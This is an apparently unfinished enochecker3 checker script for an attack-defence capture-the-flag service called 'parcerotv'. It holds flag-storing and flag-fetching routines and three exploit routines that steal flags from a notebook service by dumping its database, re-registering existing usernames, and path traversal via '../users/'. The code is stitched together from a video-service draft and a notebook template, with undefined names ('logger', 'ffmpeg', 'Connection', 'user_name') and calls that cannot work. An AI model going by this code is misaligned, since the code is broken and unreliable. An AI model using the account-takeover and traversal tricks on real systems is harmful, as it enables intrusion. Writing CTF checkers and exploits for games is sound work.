from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import os
from httpx import AsyncClient
from names import adjectives, content_types, cities, countrys


from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 7777
checker = Enochecker("parcerotv", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

async def signup(client: AsyncClient, username: str, password:str):
    logger.info(f"Starting signup process for user: {user_name}")
    signup_data = {"username": username,
                   "password": password}
    response = await client.post("/newuser", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    if status_code in [200]:
        logger.info(f"user:{username} successfully registered")
    else:
        logger.error(f"Failed to sign up user, status_code: {status_code}")
        raise MumbleException(f"Failed to sign up user, status_code: {status_code}")

async def login(client: AsyncClient, username:str, password: str):
    logger.info(f"Starting login process for user: {username}")
    login_data = {"username": username,
                   "password": password}
    response = await client.post("/checkcredentials", login_data)
    status_code = response.status_code
    if status_code in [303]:
        logger.info(f"Successfull login of user {username} with redirection {status_code}")
    else:
        logger.error(f"Failed Login of user {username} should be Unauthozired {status_code}")
        raise MumbleException(f"Failed Login of user {username} should be Unauthozired {status_code}")

def generate_title() -> str:
    adj = random.choice(adjectives)
    content = random.choice(content_types)
    number = random.randint(1, 10000)
    return f"{adj}-{content}-{number}"

def generate_location() -> str:
    country = random.choice(countrys)
    city = random.choice(cities)
    return f"{country}, {city}"

def get_random_video_path(path="videos") -> str:
    video_extensions = {".mp4", ".mov", ".avi", ".mkv", ".webm", ".flv"}
    with os.scandir(path) as entries:
        videos = [entry.name for entry in entries
                  if entry.is_file() and os.path.splitext(entry.name)[1].lower() in video_extensions]
    if not videos:
        raise FileNotFoundError("No video files found in the directory.")
    return os.path.join(path, random.choice(videos))
    
def get_random_thumbnail_path(path="thumbnails") -> str:
    """Returns the full path to a random PNG thumbnail from the specified directory."""
    if not os.path.exists(path):
        raise FileNotFoundError(f"Directory '{path}' does not exist.")
    
    thumbnails = [
        f for f in os.listdir(path)
        if os.path.isfile(os.path.join(path, f)) and f.lower().endswith(".png")
    ]

    if not thumbnails:
        raise FileNotFoundError("No PNG thumbnails found in the directory.")

    return os.path.join(path, random.choice(thumbnails))
    

def create_video_with_metadata(creator, location, title):
    """change metadata of video so it can be exploited later with ffmpeg"""
    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator}")
    video_path = get_random_video_path()
    ffmpeg.input(video_path).output(
    'metadata_video.mp4',
    **{
        'metadata:title': title,
        'metadata:creator': creator,
        'metadata:location': location
    }
).overwrite_output().run()
  
    

async def upload_private_video(client: AsyncClient, description, location, title)-> str:
   """Upload a private video, description is the flag store"""
   logger.info(f"uploading a private video")
   
   multiform_data = {
        "name": (None,title),
        "description": (None,description),
        "location": (None,location),
        "thumbnail": ("thumbnail", open(get_random_thumbnail_path(),"rb"), "image/png"),
        "file": ("video", "metadata_video.mp4", "video/mp4"),
        "is_private": (None,1)
    }
   response = await client.post("create_video", files=multiform_data)
   status_code = response.status_code
   
   if status_code in [303]:
       logger.info(f"Video was succesfully uploaded")
       redirect_url = response.headers.get("Location")
       logger.info(f"Redirected to: {redirect_url}")
       return redirect_url 
   else:
       raise MumbleException(f"failed to upload video {title}, with location: {location}")

"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_note(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    logger.debug(f"Connecting to service")
    # Register a new user
    await client.signup(username, password)
    # Login
    await client.login(username, password)
    
    #Create Data for video
    title = generate_title()
    location = generate_location()
    description: str  = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    logger.debug(f"Creating video with right metadata for exploit")
    create_video_with_metadata(creator=username, location=location, title=title)
    logger.debug(f"Saving flag")
    url = await upload_private_video(client, description, location, title)
    

    #save flag and userdata
    await db.set("userdata", (username, password, url, description))

    return username

@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient
) -> None:
    try:
        username, password, url, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login(client, username, password)

    response = await client.get(url)
    logger.debug(response.text)
    assert_in(task.flag, response.text, "Flag missing")
        

@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
    logger.debug(f"Connecting to the service")
    welcome = await conn.reader.readuntil(b">")

    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
    username = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    randomNote = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=36)
    )

    # Register another user
    await conn.register_user(username, password)

    # Now we need to login
    await conn.login_user(username, password)

    # Finally, we can post our note!
    logger.debug(f"Sending command to save a note")
    conn.writer.write(f"set {randomNote}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"Note saved! ID is ")

    try:
        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
    except Exception as ex:
        logger.debug(f"Failed to retrieve note: {ex}")
        raise MumbleException("Could not retrieve NoteId")

    assert_equals(len(noteId) > 0, True, message="Empty noteId received")

    logger.debug(f"{noteId}")

    # Exit!
    logger.debug(f"Sending exit command")
    conn.writer.write(f"exit\n".encode())
    await conn.writer.drain()

    await db.set("userdata", (username, password, noteId, randomNote))
        
@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
    try:
        (username, password, noteId, randomNote) = await db.get('userdata')
    except:
        raise MumbleException("Putnoise Failed!") 

    logger.debug(f"Connecting to service")
    welcome = await conn.reader.readuntil(b">")

    # Let's login to the service
    await conn.login_user(username, password)

    # Let´s obtain our note.
    logger.debug(f"Sending command to retrieve note: {noteId}")
    conn.writer.write(f"get {noteId}\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b">")
    if not randomNote.encode() in data:
        raise MumbleException("Resulting flag was found to be incorrect")

    # Exit!
    logger.debug(f"Sending exit command")
    conn.writer.write(f"exit\n".encode())
    await conn.writer.drain()


@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
    logger.debug(f"Connecting to service")
    welcome = await conn.reader.readuntil(b">")

    # In variant 0, we'll check if the help text is available
    logger.debug(f"Sending help command")
    conn.writer.write(f"help\n".encode())
    await conn.writer.drain()
    helpstr = await conn.reader.readuntil(b">")

    for line in [
        "This is a notebook service. Commands:",
        "reg USER PW - Register new account",
        "log USER PW - Login to account",
        "set TEXT..... - Set a note",
        "user  - List all users",
        "list - List all notes",
        "exit - Exit!",
        "dump - Dump the database",
        "get ID",
    ]:
        assert_in(line.encode(), helpstr, "Received incomplete response.")

@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
    logger.debug(f"Connecting to service")
    welcome = await conn.reader.readuntil(b">")

    # In variant 1, we'll check if the `user` command still works.
    username = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    # Register and login a dummy user
    await conn.register_user(username, password)
    await conn.login_user(username, password)

    logger.debug(f"Sending user command")
    conn.writer.write(f"user\n".encode())
    await conn.writer.drain()
    ret = await conn.reader.readuntil(b">")
    if not b"User 0: " in ret:
        raise MumbleException("User command does not return any users")

    if username:
        assert_in(username.encode(), ret, "Flag username not in user output")

    # conn.writer.close()
    # await conn.writer.wait_closed()

@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
    logger.debug(f"Connecting to service")
    welcome = await conn.reader.readuntil(b">")

    # In variant 2, we'll check if the `list` command still works.
    username = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    randomNote = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=36)
    )

    # Register and login a dummy user
    await conn.register_user(username, password)
    await conn.login_user(username, password)

    logger.debug(f"Sending command to save a note")
    conn.writer.write(f"set {randomNote}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"Note saved! ID is ")

    try:
        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
    except Exception as ex:
        logger.debug(f"Failed to retrieve note: {ex}")
        raise MumbleException("Could not retrieve NoteId")

    assert_equals(len(noteId) > 0, True, message="Empty noteId received")

    logger.debug(f"{noteId}")

    logger.debug(f"Sending list command")
    conn.writer.write(f"list\n".encode())
    await conn.writer.drain()

    data = await conn.reader.readuntil(b">")
    if not noteId.encode() in data:
        raise MumbleException("List command does not work as intended")

@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
    welcome = await conn.reader.readuntil(b">")
    conn.writer.write(b"dump\nexit\n")
    await conn.writer.drain()
    data = await conn.reader.read(-1)
    if flag := searcher.search_flag(data):
        return flag
    raise MumbleException("flag not found")

@checker.exploit(1)
async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
    welcome = await conn.reader.readuntil(b">")
    conn.writer.write(b"user\n")
    await conn.writer.drain()

    # TODO: Use flag hints
    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
    for user in user_list:
        user_name = user.split()[-1]
        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
        await conn.writer.drain()
        await conn.reader.readuntil(b">")  # successfully registered
        await conn.reader.readuntil(b">")  # successfully logged in
        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
        for note in notes_list:
            note_id = note.split()[-1]
            conn.writer.write(b"get %s\n" % note_id)
            await conn.writer.drain()
            data = await conn.reader.readuntil(b">")
            if flag := searcher.search_flag(data):
                return flag
    raise MumbleException("flag not found")

@checker.exploit(2)
async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
    welcome = await conn.reader.readuntil(b">")
    conn.writer.write(b"user\n")
    await conn.writer.drain()

    # TODO: Use flag hints?
    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
    for user in user_list:
        user_name = user.split()[-1]
        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
        await conn.writer.drain()
        await conn.reader.readuntil(b">")  # successfully registered
        await conn.reader.readuntil(b">")  # successfully logged in
        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
        for note in notes_list:
            note_id = note.split()[-1]
            conn.writer.write(b"get %s\n" % note_id)
            await conn.writer.drain()
            data = await conn.reader.readuntil(b">")
            if flag := searcher.search_flag(data):
                return flag
    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()